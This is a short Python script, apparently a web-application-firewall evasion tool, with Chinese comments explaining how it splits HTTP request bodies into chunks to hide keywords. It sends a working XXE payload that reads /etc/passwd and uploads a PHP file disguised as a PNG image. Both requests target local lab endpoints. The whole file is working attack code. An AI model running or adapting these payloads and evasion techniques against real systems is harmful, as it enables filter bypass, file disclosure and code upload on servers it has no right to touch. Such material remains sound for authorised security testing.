#coding=utf8
from ChunkedHTTPAdapter import ChunkedHTTPAdapter
import requests

data = r'data=%3C%3Fxml+version%3D%221.0%22+encoding%3D%22ISO-8859-1%22%3F%3E%3C%21DOCTYPE+foo+%5B+++%3C%21ELEMENT+foo+ANY+%3E++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22+%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E'

achunk_length = 50
def gen():
    for i in range(int(len(data)/achunk_length)+1):
        yield data[i*achunk_length:(i*achunk_length)+achunk_length].encode()

headers={
    "Content-Type":"application/x-www-form-urlencoded"
}

files = {
    'file':('phpinfo.php',"<?=phpinfo();?>",'image/png')
}


adaptor = ChunkedHTTPAdapter()
'''
#自己指定分割区间，默认10-1000
import random
adaptor = ChunkedHTTPAdapter(chunk_length=lambda :random.randint(100,1000))
'''
#设置需要拆分的关键字，大小写敏感。
adaptor.keyword_list = ["xml",".php","phpinfo","a","ENTITY","SYSTEM"]
s = requests.Session()
s.mount('http://', adaptor)
s.mount('https://', adaptor)
#POST数据
r = s.post("http://127.0.0.1:8000/vulns/xxe.jsp",data=data,headers=headers)
print(r.text)
#POST+上传
r = s.post("http://127.0.0.1:8000/vulns/upload.jsp",files=files)
print(r.text)

